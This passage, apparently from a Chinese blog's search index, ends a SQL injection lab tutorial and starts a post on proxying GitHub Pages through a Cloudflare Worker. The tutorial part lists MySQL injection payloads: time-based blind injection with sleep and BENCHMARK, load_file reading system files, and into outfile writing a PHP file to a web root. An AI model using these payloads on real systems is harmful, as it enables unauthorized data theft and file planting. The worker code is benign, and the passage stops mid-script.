class=\"meta\">#</span><span class=\"bash\"> sleep延时注入</span></span><br><span class=\"line\">If(ascii(substr(database(),1,1))=116,1,sleep(3))--+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> benchmark延时注入</span></span><br><span class=\"line\">If(ascii(substr(database(),1,1))=116,1,BENCHMARK(50000000,ENCODE(%27MSG%27,%27by%205%20seconds%27)))--+</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"less7-导出\"><a href=\"#less7-导出\" class=\"headerlink\" title=\"less7 导出\"></a>less7 导出</h2><h3 id=\"load-file-导出文件\"><a href=\"#load-file-导出文件\" class=\"headerlink\" title=\"load_file()导出文件\"></a>load_file()导出文件</h3><p>load_file(file_name)<br>**使用条件： **</p>\n<ol>\n<li>必须拥有权限，并且文件可读，可通过<code>and (select count(*) from mysql.user)&gt;0</code>，如果 返回正常，则有读写权限</li>\n<li>必须指定文件的绝对路径</li>\n<li>文件必须小于<code>max_allowed_packet</code></li>\n</ol>\n<p>常见用法：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"keyword\">load_file</span>(<span class=\"built_in\">char</span>(<span class=\"number\">99</span>,<span class=\"number\">58</span>,<span class=\"number\">47</span>,<span class=\"number\">98</span>,<span class=\"number\">111</span>,<span class=\"number\">111</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">105</span>)) <span class=\"keyword\">Explain</span>:“<span class=\"built_in\">char</span>(<span class=\"number\">99</span>,<span class=\"number\">58</span>,<span class=\"number\">47</span>,<span class=\"number\">98</span>,<span class=\"number\">111</span>,<span class=\"number\">111</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">105</span>)”就是“c:/boot.ini”的 <span class=\"keyword\">ASCII</span> 代码</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"keyword\">load_file</span>(<span class=\"number\">0x633a2f626f6f742e696e69</span>) </span><br><span class=\"line\"><span class=\"keyword\">Explain</span>:“c:/boot.ini”的 <span class=\"number\">16</span> 进制是“<span class=\"number\">0x633a2f626f6f742e696e69</span>”</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"keyword\">load_file</span>(c:\\\\boot.ini) </span><br><span class=\"line\"><span class=\"keyword\">Explain</span>:路径里的/用 \\\\代替</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"select-into-outfile-写文件\"><a href=\"#select-into-outfile-写文件\" class=\"headerlink\" title=\"select into outfile 写文件\"></a>select into outfile 写文件</h3><ol>\n<li>直接写入文件<br><code>Select version() into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php”</code></li>\n<li>写入文件尾<br><code>Select version() Into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php” LINES TERMINATED BY 0x16进制文件</code></li>\n</ol>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p>1、《mysql注入天书》</p>\n","categories":["Pentest"],"tags":["SQL注入"]},{"title":"github page通过cloudflare worker提速","url":"http://blog.le31ei.top/2020/09/22/github-page通过cloudflare-worker提速/","content":"<p>使用github page搭建博客方面很多，基本不用维护，但国内的访问速度非常慢，加载资源时间太长。于是百度了以下，发现有多种解决方案，国内cdn需要域名备案，太麻烦，所以采用了cloudflare提供的worker方式。</p>\n<p>其原理很简单，就是可以手写代码在worker中运行。通过该方式可以将worker修改为反向代理，通过worker的加速节点去访问我们的域名，具体配置如下：</p>\n<h1 id=\"0x01-创建worker\"><a href=\"#0x01-创建worker\" class=\"headerlink\" title=\"0x01 创建worker\"></a>0x01 创建worker</h1><p>点击worker标签，进入worker设置页面，点击创建worker</p>\n<p><img src=\"/2020/09/22/github-page%E9%80%9A%E8%BF%87cloudflare-worker%E6%8F%90%E9%80%9F/image-20200922153741195.png\" alt=\"image-20200922153741195\"></p>\n<p><img src=\"/2020/09/22/github-page%E9%80%9A%E8%BF%87cloudflare-worker%E6%8F%90%E9%80%9F/image-20200922153755348.png\" alt=\"image-20200922153755348\"></p>\n<p>输入以下代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * static files (404.html, sw.js, conf.js)</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> ASSET_URL = <span class=\"string\">&#x27;https://le31ei.github.io&#x27;</span>  <span class=\"comment\">// 输入需要代理的url</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> JS_VER = <span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> MAX_RETRY = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** <span class=\"doctag\">@type <span class=\"type\">&#123;RequestInit&#125;</span> </span>*/</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> PREFLIGHT_INIT = &#123;</span><br><span class=\"line\">  status: <span class=\"number\">204</span>,</span><br><span class=\"line\">  headers: <span class=\"keyword\">new</span> Headers(&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;access-control-allow-origin&#x27;</span>: <span class=\"string\">&#x27;*&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;access-control-allow-methods&#x27;</span>: <span class=\"string\">&#x27;GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;access-control-max-age&#x27;</span>: <span class=\"string\">&#x27;1728000&#x27;</span>,</span><br><span class=\"line\">  &#125;),</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;any&#125;</span> <span class=\"variable\">body</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;number&#125;</span> <span class=\"variable\">status</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Object&lt;string, string&gt;&#125;</span> <span class=\"variable\">headers</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">makeRes</span>(<span class=\"params\">body, status = <span class=\"number\">200</span>, headers = &#123;&#125;</span>) </span>&#123;</span><br><span class=\"line\">  headers[<span class=\"string\">&#x27;--ver&#x27;</span>] = JS_VER</span><br><span class=\"line\">  headers[<span class=\"string\">&#x27;access-control-allow-origin&#x27;</span>] = <span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Response(body, &#123;status, headers&#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;string&#125;</span> </span>urlStr </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">newUrl</span>(<span class=\"params\">urlStr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> URL(urlStr)</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (err) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">addEventListener(<span class=\"string\">&#x27;fetch&#x27;</span>, <span class=\"function\"><span class=\"params\">e</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> ret = fetchHandler(e)</span><br><span class=\"line\">    .catch(<span class=\"function\"><span class=\"params\">err</span> =&gt;</span> makeRes(<span class=\"string\">&#x27;cfworker error:\\n&#x27;</span> + err.stack, <span class=\"number\">502</span>))</span><br><span class=\"line\">  e.respondWith(ret)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;FetchEvent&#125;</span> </span>e </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fetchHandler</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> req = e.request</span><br><span class=\"line\">  <span class=\"keyword\">const</span> urlStr = req.url</span><br><span class=\"line\">  <span class=\"keyword\">const</span> urlObj = <span class=\"keyword\">new</span> URL(urlStr)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> path = urlObj.href.substr(urlObj.origin.length)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (urlObj.protocol === <span class=\"string\">&#x27;http:&#x27;</span>) &#123;</span><br><span class=\"line\">    urlObj.protocol = <span class=\"string\">&#x27;https:&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"number\">301</span>, &#123;</span><br><span class=\"line\">      <span class=\"string\">&#x27;strict-transport-security&#x27;</span>: <span class=\"string\">&#x27;max-age=99999999; includeSubDomains; preload&#x27;</span>,</span><br><span class=\"line\">      <span class=\"string\">&#x27;location&#x27;</span>: urlObj.href,</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (path.startsWith(<span class=\"string\">&#x27;/http/&#x27;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> httpHandler(req, path.substr(<span class=\"number\">6</span>))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (path) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">case</span> <span class=\"string\">&#x27;/http&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;请更新 cfworker 到最新版本!&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">case</span> <span class=\"string\">&#x27;/ws&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;not support&#x27;</span>, <span class=\"number\">400</span>)</span><br><span class=\"line\">  <span class=\"keyword\">case</span> <span class=\"string\">&#x27;/works&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;it works&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"comment\">// static files</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> fetch(ASSET_URL + path)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Request&#125;</span> <span class=\"variable\">req</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;string&#125;</span> <span class=\"variable\">pathname</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpHandler</span>(<span class=\"params\">req, pathname</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> reqHdrRaw = req.headers</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (reqHdrRaw.has(<span class=\"string\">&#x27;x-jsproxy&#x27;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Response.error()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// preflight</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (req.method === <span class=\"string\">&#x27;OPTIONS&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      reqHdrRaw.has(<span class=\"string\">&#x27;access-control-request-headers&#x27;</span>)</span><br><span class=\"line\">  ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Response(<span class=\"literal\">null</span>, PREFLIGHT_INIT)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> acehOld = <span class=\"literal\">false</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> rawSvr = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> rawLen = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> rawEtag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> reqHdrNew = <span class=\"keyword\">new</span> Headers(reqHdrRaw)</span><br><span class=\"line\">  reqHdrNew.set(<span class=\"string\">&#x27;x-jsproxy&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 此处逻辑和 http-dec-req-hdr.lua 大致相同</span></span><br><span class=\"line\">  <span class=\"comment\">// https://github.com/EtherDream/jsproxy/blob/master/lua/http-dec-req-hdr.lua</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> refer = reqHdrNew.get(<span class=\"string\">&#x27;referer&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> query = refer.substr(refer.indexOf(<span class=\"string\">&#x27;?&#x27;</span>) + <span class=\"number\">1</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!query) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;missing params&#x27;</span>, <span class=\"number\">403</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> param = <span class=\"keyword\">new</span> URLSearchParams(query)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> [k, v] <span class=\"keyword\">of</span> <span class=\"built_in\">Object</span>.entries(param)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (k.substr(<span class=\"number\">0</span>, <span class=\"number\">2</span>) === <span class=\"string\">&#x27;--&#x27;</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 系统信息</span></span><br><span class=\"line\">      <span class=\"keyword\">switch</span> (k.substr(<span class=\"number\">2</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;aceh&#x27;</span>:</span><br><span class=\"line\">        acehOld = <span class=\"literal\">true</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;raw-info&#x27;</span>:</span><br><span class=\"line\">        [rawSvr, rawLen, rawEtag] = v.split(<span class=\"string\">&#x27;|&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 还原 HTTP 请求头</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (v) &#123;</span><br><span class=\"line\">        reqHdrNew.set(k, v)</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        reqHdrNew.delete(k)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!param.has(<span class=\"string\">&#x27;referer&#x27;</span>)) &#123;</span><br><span class=\"line\">    reqHdrNew.delete(<span class=\"string\">&#x27;referer&#x27;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// cfworker 会把路径中的 `//` 合并成 `/`</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> urlStr = pathname.replace(<span class=\"regexp\">/^(https?):\\/+/</span>, <span class=\"string\">&#x27;$1://&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> urlObj = newUrl(urlStr)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!urlObj) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;invalid proxy url: &#x27;</span> + urlStr, <span class=\"number\">403</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/** <span class=\"doctag\">@type <span class=\"type\">&#123;RequestInit&#125;</span> </span>*/</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> reqInit = &#123;</span><br><span class=\"line\">    method: req.method,</span><br><span class=\"line\">    headers: reqHdrNew,</span><br><span class=\"line\">    redirect: <span class=\"string\">&#x27;manual&#x27;</span>,</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (req.method === <span class=\"string\">&#x27;POST&#x27;</span>) &#123;</span><br><span class=\"line\">    reqInit.body = req.body</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> proxy(urlObj, reqInit, acehOld, rawLen, <span class=\"number\">0</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;URL&#125;</span> </span>urlObj </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;RequestInit&#125;</span> </span>reqInit </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;number&#125;</span> </span>retryTimes </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">proxy</span>(<span class=\"params\">urlObj, reqInit, acehOld, rawLen, retryTimes</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = <span class=\"keyword\">await</span> fetch(urlObj.href, reqInit)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> resHdrOld = res.headers</span><br><span class=\"line\">  <span class=\"keyword\">const</span> resHdrNew = <span class=\"keyword\">new</span> Headers(resHdrOld)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> expose = <span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> [k, v] <span class=\"keyword\">of</span> resHdrOld.entries()) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (k === <span class=\"string\">&#x27;access-control-allow-origin&#x27;</span> ||</span><br><span class=\"line\">        k === <span class=\"string\">&#x27;access-control-expose-headers&#x27;</span> ||</span><br><span class=\"line\">        k === <span class=\"string\">&#x27;location&#x27;</span> ||</span><br><span class=\"line\">        k === <span class=\"string\">&#x27;set-cookie&#x27;</span></span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> x = <span class=\"string\">&#x27;--&#x27;</span> + k</span><br><span class=\"line\">      resHdrNew.set(x, v)</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (acehOld) &#123;</span><br><span class=\"line\">        expose = expose + <span class=\"string\">&#x27;,&#x27;</span> + x</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      resHdrNew.delete(k)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (acehOld &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;cache-control&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span 